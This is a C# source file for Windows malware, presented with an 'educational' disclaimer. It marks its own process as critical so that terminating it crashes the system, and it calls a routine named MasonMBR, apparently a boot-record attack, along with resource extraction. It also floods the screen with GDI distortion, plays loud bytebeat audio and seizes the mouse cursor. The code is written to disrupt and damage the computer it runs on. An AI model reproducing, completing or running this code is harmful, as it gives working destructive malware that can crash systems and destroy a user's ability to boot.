
/*

   / $$$$$$$   /$$$$$$   /$$$$$$  /$$        /$$$$$$  /$$      /$$ /$$$$$$$$ /$$$$$$$ 
   | $$__  $$ /$$__  $$ /$$__  $$| $$       /$$__  $$| $$$    /$$$| $$_____/| $$__  $$
   | $$  \ $$| $$  \__/| $$  \__/| $$      | $$  \ $$| $$$$  /$$$$| $$      | $$  \ $$
   | $$  | $$|  $$$$$$ | $$      | $$      | $$$$$$$$| $$ $$/$$ $$| $$$$$   | $$$$$$$/
   | $$  | $$ \____  $$| $$      | $$      | $$__  $$| $$  $$$| $$| $$__/   | $$__  $$
   | $$  | $$ /$$  \ $$| $$    $$| $$      | $$  | $$| $$\  $ | $$| $$      | $$  \ $$
   | $$$$$$$/|  $$$$$$/|  $$$$$$/| $$$$$$$$| $$  | $$| $$ \/  | $$| $$$$$$$$| $$  | $$
   |_______/  \______/  \______/ |________/|__/  |__/|__/     |__/|________/|__/  |__/ 

       The software is provided as-is for educational and research purposes only
               The author is not responsible for any misuse, damage
                  or illegal activities caused by this software
                              Use at your own risk
*/

using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace F1r4e8e3m6a0s5o7n9r2y
{
    internal static class MasonSpearhead
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr MasonhProcess, int MasonProcessInformationClass, ref int MasonProcessInformation, int MasonProcessInformationLength);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr MasonH);
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr MasonH, IntPtr MasonDc);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr MasonH, IntPtr MasonR, bool MasonE);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr MasonD, int MasonX, int MasonY, int MasonW, int MasonH, IntPtr MasonS, int MasonSx, int MasonSy, int MasonR);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr MasonD, int MasonX, int MasonY, int MasonW, int MasonH, IntPtr MasonS, int MasonSx, int MasonSy, int MasonSw, int MasonSh, int MasonR);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr MasonD, int MasonX, int MasonY, int MasonW, int MasonH, int MasonR);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int MasonC);
        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr MasonD, IntPtr MasonO);
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int MasonN);
        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr MasonD, int MasonX, int MasonY, IntPtr MasonI);
        [DllImport("user32.dll")]
        static extern IntPtr LoadCursor(IntPtr MasonH, int MasonI);
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int MasonX, int MasonY);
        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out Point MasonP);

        static int MasonW, MasonH;
        static Random MasonG = new Random();

        static void Main()
        {
            // BSOD AFTER KILL
            int MasonisCritical = 1;
            int MasonBreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, MasonBreakOnTermination, ref MasonisCritical, sizeof(int));

            MasonTasks().GetAwaiter().GetResult();

            MasonW = GetSystemMetrics(0);
            MasonH = GetSystemMetrics(1);

            // BYTEBEAT
            const int MasonSR = 8500;
            const int MasonBUF = MasonSR * 40;

            Func<int, int>[] MasonBeats = {
                t => (int)((t*t*3>>8^t*7)&(t>>5|t>>8)|(t*13&t>>4)^(t>>2&t*99>>7))&255,
                t => (int)((t*(t>>9^t>>13)&255)+(t*t>>6&127)^(t>>3)*(t*5&(t>>7|t>>11)))&255,
                t => (int)((t*5&t>>7)|(t*3&t>>10)^(t*23>>4&t)|(t>>2)*(t^t>>8)&(t>>4|128))&255,
                t => (int)((t*(t>>3|t>>6)&127)^(t*t*t>>12)|(t*17^t>>5)&(t<<1|t>>9))&255
            };

            Task.Run(() => MasonCursorTrail());
            Task.Run(() => MasonCursorMove());

            int MasonBi = 0, MasonPh = 0;

            for (; ; )
            {
                string MasonTmp = Path.GetTempFileName();
                byte[] MasonRaw = new byte[MasonBUF];
                for (int MasonT = 0; MasonT < MasonBUF; MasonT++)
                    MasonRaw[MasonT] = (byte)(MasonBeats[MasonBi](MasonT) & 0xFF);

                using (var MasonFs = new FileStream(MasonTmp, FileMode.Create))
                using (var MasonBw = new BinaryWriter(MasonFs))
                {
                    MasonBw.Write(new[] { 'R', 'I', 'F', 'F' });
                    MasonBw.Write(36 + MasonRaw.Length);
                    MasonBw.Write(new[] { 'W', 'A', 'V', 'E' });
                    MasonBw.Write(new[] { 'f', 'm', 't', ' ' });
                    MasonBw.Write(16);
                    MasonBw.Write((short)1);
                    MasonBw.Write((short)1);
                    MasonBw.Write(MasonSR);
                    MasonBw.Write(MasonSR);
                    MasonBw.Write((short)1);
                    MasonBw.Write((short)8);
                    MasonBw.Write(new[] { 'd', 'a', 't', 'a' });
                    MasonBw.Write(MasonRaw.Length);
                    MasonBw.Write(MasonRaw);
                }

                var MasonSp = new SoundPlayer(MasonTmp);
                MasonSp.PlayLooping();
                var MasonT0 = Environment.TickCount;

                // GDI
                while (Environment.TickCount - MasonT0 < 15000)
                {
                    var MasonDc = GetDC(GetDesktopWindow());
                    MasonPh++;

                    switch (MasonBi)
                    {
                        case 0:
                            for (int MasonRing = 12; MasonRing > 0; MasonRing--)
                            {
                                int MasonSz = MasonRing * (Math.Min(MasonW, MasonH) / 12);
                                double MasonSp2 = MasonPh * 0.1 + MasonRing * 0.6;
                                int MasonOx = (int)(Math.Sin(MasonSp2) * 30), MasonOy = (int)(Math.Cos(MasonSp2) * 30);
                                StretchBlt(MasonDc, (MasonW - MasonSz) / 2 + MasonOx, (MasonH - MasonSz) / 2 + MasonOy, MasonSz, MasonSz,
                                    MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                            }
                            SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                            PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                            break;

                        case 1:
                            BitBlt(MasonDc, MasonG.Next(-60, 60), MasonG.Next(-60, 60), MasonW, MasonH, MasonDc, 0, 0, 0x00CC0020);
                            for (int MasonS = 0; MasonS < 20; MasonS++)
                            {
                                int MasonSy = MasonG.Next(MasonH), MasonSh = 2 + MasonG.Next(30);
                                BitBlt(MasonDc, MasonG.Next(-120, 120), MasonSy, MasonW, MasonSh, MasonDc, 0, MasonSy, 0x00CC0020);
                            }
                            SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                            PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                            if (MasonPh % 4 < 2)
                                PatBlt(MasonDc, 0, 0, MasonW,   MasonH, 0x00550009);
                            break;

                        case 2:
                            StretchBlt(MasonDc, MasonW, 0, -MasonW, MasonH, MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                            StretchBlt(MasonDc, 0, MasonH, MasonW, -MasonH, MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                            for (int k = 0; k < 10; k++)
                            {
                                int MasonKx = MasonG.Next(MasonW), MasonKy = MasonG.Next(MasonH);
                                int MasonKw = 80 + MasonG.Next(250), MasonKh = 80 + MasonG.Next(250);
                                StretchBlt(MasonDc, MasonKx, MasonKy, -MasonKw, MasonKh, MasonDc, MasonKx, MasonKy, MasonKw, MasonKh, 0x00CC0020);
                            }
                            SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                            PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                            break;

                        case 3:
                            double MasonPx = Math.Sin(MasonPh * 0.15) * 0.5 + 1.0;
                            double MasonPy = Math.Cos(MasonPh * 0.11) * 0.4 + 1.0;
                            int MasonPpw = (int)(MasonW * MasonPx), MasonPph = (int)(MasonH * MasonPy);
                            StretchBlt(MasonDc, (MasonW - MasonPpw) / 2, (MasonH - MasonPph) / 2, MasonPpw, MasonPph, MasonDc, 0, 0, MasonW, MasonH, 0x00CC0020);
                            SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(16777216)));
                            PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x005A0049);
                            if (MasonPh % 6 < 2)
                                PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x00550009);
                            break;
                    }

                    for (int i = 0; i < 8; i++)
                    {
                        int MasonCx = MasonG.Next(MasonW), MasonCy = MasonG.Next(MasonH), MasonSz = 40 + MasonG.Next(150);
                        BitBlt(MasonDc, MasonCx + MasonG.Next(-70, 70), MasonCy + MasonG.Next(-70, 70), MasonSz, MasonSz, MasonDc, MasonCx, MasonCy, 0x00CC0020);
                    }

                    if (MasonG.Next(15) == 0)
                    {
                        SelectObject(MasonDc, CreateSolidBrush(MasonG.Next(50)));
                        PatBlt(MasonDc, 0, 0, MasonW, MasonH, 0x00420000);
                        Thread.Sleep(25);
                    }

                    ReleaseDC(GetDesktopWindow(), MasonDc);
                    Thread.Sleep(50);
                }

                MasonSp.Dispose();

                try { File.Delete(MasonTmp); } catch { }

                for (int n = 0; n < 10; n++)
                {
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                    Thread.Sleep(10);
                }

                MasonBi = (MasonBi + 1) % MasonBeats.Length;

                if (MasonBi == 0)
                {
                    Environment.Exit(0);
                }
            }
        }

        static async Task MasonCursorTrail()
        {
            await Task.Run(() =>
            {
                IntPtr[] MasonCursors = new IntPtr[7];
                MasonCursors[0] = LoadCursor(IntPtr.Zero, 32512);
                MasonCursors[1] = LoadCursor(IntPtr.Zero, 32513);
                MasonCursors[2] = LoadCursor(IntPtr.Zero, 32514);
                MasonCursors[3] = LoadCursor(IntPtr.Zero, 32515);
                MasonCursors[4] = LoadCursor(IntPtr.Zero, 32516);
                MasonCursors[5] = LoadCursor(IntPtr.Zero, 32642);
                MasonCursors[6] = LoadCursor(IntPtr.Zero, 32643);

                while (true)
                {
                    GetCursorPos(out Point MasonPos);
                    var MasonDc = GetDC(GetDesktopWindow());

                    for (int MasonI = 0; MasonI < 5; MasonI++)
                    {
                        int MasonOx = MasonPos.X + MasonG.Next(-40, 40);
                        int MasonOy = MasonPos.Y + MasonG.Next(-40, 40);
                        DrawIcon(MasonDc, MasonOx, MasonOy, MasonCursors[MasonG.Next(MasonCursors.Length)]);
                    }

                    ReleaseDC(GetDesktopWindow(), MasonDc);
                    Thread.Sleep(30);
                }
            });
        }

        static async Task MasonCursorMove()
        {
            await Task.Run(() =>
            {
                double MasonA = 0;
                bool MasonPanic = false;
                int MasonTimer = 0;

                while (true)
                {
                    MasonA += MasonPanic ? 0.5 : 0.06;
                    MasonTimer++;
                    if (MasonTimer > 60 + MasonG.Next(100)) { MasonPanic = !MasonPanic; MasonTimer = 0; }

                    int MasonRad = MasonPanic ? MasonG.Next(50, 500) : 120 + (int)(Math.Sin(MasonA * 0.2) * 80);
                    int MasonMx = MasonW / 2 + (int)(Math.Cos(MasonA) * MasonRad) + (MasonPanic ? MasonG.Next(-100, 100) : 0);
                    int MasonMy = MasonH / 2 + (int)(Math.Sin(MasonA * 0.6) * MasonRad) + (MasonPanic ? MasonG.Next(-100, 100) : 0);
                    SetCursorPos(Math.Max(0, Math.Min(MasonW - 1, MasonMx)), Math.Max(0, Math.Min(MasonH - 1, MasonMy)));
                    Thread.Sleep(MasonPanic ? MasonG.Next(8, 20) : MasonG.Next(25, 50));
                }
            });
        }

        private static async Task MasonTasks()
        {

            await Task.Run(async () =>
            {
                if (!MasonExtrusion.MasonMBR())
                    return;

                try
                {
                    await MasonExtrusion.MasonExtractResources();
                    await MasonExtrusion.MasonFiles();
                }
                catch
                {
                }

                await MasonExtrusion.MasonCleanupFiles();
            });
        }
    }
}